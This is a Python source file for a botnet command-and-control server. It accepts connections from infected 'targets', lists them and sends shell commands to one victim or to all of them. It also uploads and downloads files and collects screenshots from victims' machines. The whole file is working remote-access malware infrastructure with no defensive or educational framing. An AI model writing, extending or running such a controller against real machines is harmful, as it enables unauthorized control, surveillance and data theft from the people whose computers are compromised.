import socket
import json
import threading


class Server:
    def __init__(self, ip, port):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((ip, port))
        print('Waiting for upcoming connections...')
        self.sock.listen(66)
        self.targets = []
        self.ips = []
        self.stop = False
        self.connections = threading.Thread(target=self.accept_connections)
        self.connections.start()
        self.number = 0

    def accept_connections(self):
        while True:
            if self.stop:
                break

            self.sock.settimeout(1)
            try:
                target, address = self.sock.accept()
                print(f'Connection  from {address}')
                self.targets.append(target)
                self.ips.append(address)
            except Exception:
                continue

    def send_data(self, data, target):
        json_data = json.dumps(data)
        target.send(json_data.encode("ISO-8859-1"))

    def receive_data(self, target):
        json_data = ''
        while True:
            try:
                json_data += target.recv(1024).decode("ISO-8859-1")
                return json.loads(json_data)
            except ValueError:
                continue

    def write_file(self, name, data):
        with open(name, 'wb') as file:
            file.write(data.encode("ISO-8859-1"))
            return 'File downloaded successfully'

    def read_file(self, path):
        with open(path, 'rb') as file:
            return file.read()

    def single_target(self, target, ip):
        while True:
            command = input(f'{ip}>> ')
            command = command.split(' ')

            try:
                if command[0] == 'upload':
                    file_data = self.read_file(command[1])
                    command.append(file_data.decode("ISO-8859-1"))

                self.send_data(command, target)

                if command[0] == 'exit':
                    break

                if command[0] == 'screenshot':
                    file_data = self.receive_data(target)
                    self.write_file(f'screenshot{self.number}.png', file_data)
                    self.number += 1
                    print('screenshot saved')

                elif command[0] == 'download':
                    file_data = self.receive_data(target)
                    if len(file_data):
                        result = self.write_file(command[1], file_data)
                        print(result)
                    else:
                        print('Error! Check if file name is correct')
                else:
                    result = self.receive_data(target)
                    print(result)
            except Exception as exc:
                print('Server error, check your command', exc)

    def botnet(self):
        while True:
            command = input('-Botnet~: ')
            command = command.split(' ')

            try:
                if command[0] == 'list':
                    for count, ip in enumerate(self.ips):
                        print(f'Target {count} with ip {ip}')
                    if len(self.ips) == 0:
                        print('[-] List is empty')

                elif command[0] == 'exit':
                    for target in self.targets:
                        self.send_data('quit', target)
                        target.close()
                    self.sock.close()
                    self.stop = True
                    self.connections.join()
                    print('Disconnected')
                    break

                elif command[0] == 'disconnect':
                    try:
                        target = self.targets[int(command[1])]
                        ip = self.ips[int(command[1])]
                        self.send_data('quit', target)
                        target.close()
                        self.targets.remove(target)
                        self.ips.remove(ip)
                        print(f'Successfully disconnected from {ip}')
                    except Exception as exc:
                        print(f'Something went wrong while disconnecting: {exc}')

                elif command[0] == 'target':
                    try:
                        self.single_target(self.targets[int(command[1])], self.ips[int(command[1])])
                    except Exception:
                        print('No such target!')

                elif command[0] == 'botnet':
                    try:
                        for i, target in enumerate(self.targets):
                            self.send_data(command[1], target)
                            result = self.receive_data(target)
                            print(f'{self.ips[i]} - {result}')
                    except Exception:
                        print(f'[-] Failed while sending {command[1]}')
                else:
                    print('[-] No such command')

            except Exception as exc:
                print(f'[!!!] Botnet error data: {exc}')


if __name__ == '__main__':
    srv = Server('192.168.31.151', 6666)
    srv.botnet()
